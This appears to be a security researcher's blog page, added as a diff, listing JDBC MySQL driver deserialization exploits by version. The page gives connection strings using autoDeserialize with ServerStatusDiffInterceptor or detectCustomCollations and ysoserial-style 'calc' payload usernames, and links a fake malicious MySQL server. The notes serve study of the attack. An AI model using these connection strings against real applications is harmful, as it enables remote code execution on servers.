@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+
+    
+
+    
+<div class="hd posts">
+
+    <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a>
+    <div class="post-title">
+        <p>
+            JDBC: MYSQL
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <p>参考：<a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://boogipop.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
+<p>恶意mysql：<a target="_blank" rel="noopener" href="https://github.com/4ra1n/mysql-fake-server/releases/tag/0.0.4">https://github.com/4ra1n/mysql-fake-server/releases/tag/0.0.4</a></p>
+<h1 id="ServerStatusDiffInterceptor"><a href="#ServerStatusDiffInterceptor" class="headerlink" title="ServerStatusDiffInterceptor"></a>ServerStatusDiffInterceptor</h1><h2 id="8-0-7-8-0-20"><a href="#8-0-7-8-0-20" class="headerlink" title="8.0.7-8.0.20"></a>8.0.7-8.0.20</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String url = &quot;jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&amp;user=deser_CC31_calc&quot;;</span><br><span class="line">String username = &quot;deser_CC31_calc&quot;;</span><br><span class="line">String password = &quot;&quot;;</span><br><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-mysql/image-20240226135150575.png" alt="image-20240226135150575.png"></p>
+<h2 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String url = &quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_calc&quot;;</span><br><span class="line">String username = &quot;deser_CC31_calc&quot;;</span><br><span class="line">String password = &quot;&quot;;</span><br><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-1-11-5-x-xx"><a href="#5-1-11-5-x-xx" class="headerlink" title="5.1.11-5.x.xx"></a>5.1.11-5.x.xx</h2><p>包名变了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String url = &quot;jdbc:mysql://127.0.0.1:3308/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_calc&quot;;</span><br><span class="line">String username = &quot;deser_CC31_calc&quot;;</span><br><span class="line">String password = &quot;&quot;;</span><br><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br><span class="line">DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-1-0-5-1-10"><a href="#5-1-0-5-1-10" class="headerlink" title="5.1.0-5.1.10"></a>5.1.0-5.1.10</h2><p>要多进行一次查询才会触发。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String url = &quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;;</span><br><span class="line">String username = &quot;yso_CommonsCollections4_calc&quot;;</span><br><span class="line">String password = &quot;&quot;;</span><br><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br><span class="line">String sql = &quot;select database()&quot;;</span><br><span class="line">PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">//执行查询操作，返回的是数据库结果集的数据表</span><br><span class="line">ResultSet resultSet = ps.executeQuery();</span><br></pre></td></tr></table></figure>
+
+<h1 id="detectCustomCollations"><a href="#detectCustomCollations" class="headerlink" title="detectCustomCollations"></a>detectCustomCollations</h1><h2 id="6-0-2-6-0-6"><a href="#6-0-2-6-0-6" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connection conn=null;</span><br><span class="line">String url = &quot;jdbc:mysql://127.0.0.1:3309/mysql?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=deser_CC31_calc&quot;;</span><br><span class="line">String username = &quot;deser_CC31_calc&quot;;</span><br><span class="line">String password = &quot;&quot;;</span><br><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br><span class="line">conn = DriverManager.getConnection(url, username, password);</span><br></pre></td></tr></table></figure>
+
+<p>在buildCollationMapping中，会检查detectCustomCollations这个属性是否为true，true则进入resultSetToMap。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-mysql/image-20240226205853009.png" alt="image-20240226205853009.png"></p>
+<h2 id="5-1-41-5-1-48"><a href="#5-1-41-5-1-48" class="headerlink" title="5.1.41-5.1.48"></a>5.1.41-5.1.48</h2><p>看别的师傅可以。</p>
+<p>本地测试，fake mysql可以发送payload，客户端不执行readObject，而是执行readString。</p>
+<h2 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29-5.1.40"></a>5.1.29-5.1.40</h2><p>调用栈和上面一样。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String url = &quot;jdbc:mysql://127.0.0.1:3308/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=deser_CC31_calc&quot;;</span><br><span class="line">String username = &quot;deser_CC31_calc&quot;;</span><br><span class="line">String password = &quot;&quot;;</span><br><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br><span class="line">DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-1-19-5-1-28"><a href="#5-1-19-5-1-28" class="headerlink" title="5.1.19-5.1.28"></a>5.1.19-5.1.28</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String url = &quot;jdbc:mysql://127.0.0.1:3308/test?autoDeserialize=true&amp;user=deser_CC31_calc&quot;;</span><br><span class="line">String username = &quot;deser_CC31_calc&quot;;</span><br><span class="line">String password = &quot;&quot;;</span><br><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br><span class="line">DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure>
+
+<p>在buildCollationMapping中没有检查detectCustomCollations这个属性是否为true。</p>
+<p>调用栈和上面的一样。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-mysql/image-20240226212846983.png" alt="image-20240226212846983.png"></p>
+<h2 id="8-x-x-和-5-1-49-与-5-1-19以下"><a href="#8-x-x-和-5-1-49-与-5-1-19以下" class="headerlink" title="8.x.x 和 5.1.49 与 5.1.19以下"></a>8.x.x 和 5.1.49 与 5.1.19以下</h2><p>在buildCollationMapping中不调用<code>ResultSetUtil.resultSetToMap</code></p>
+
+    </div>
+
+    
+
+
+</div>
+
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
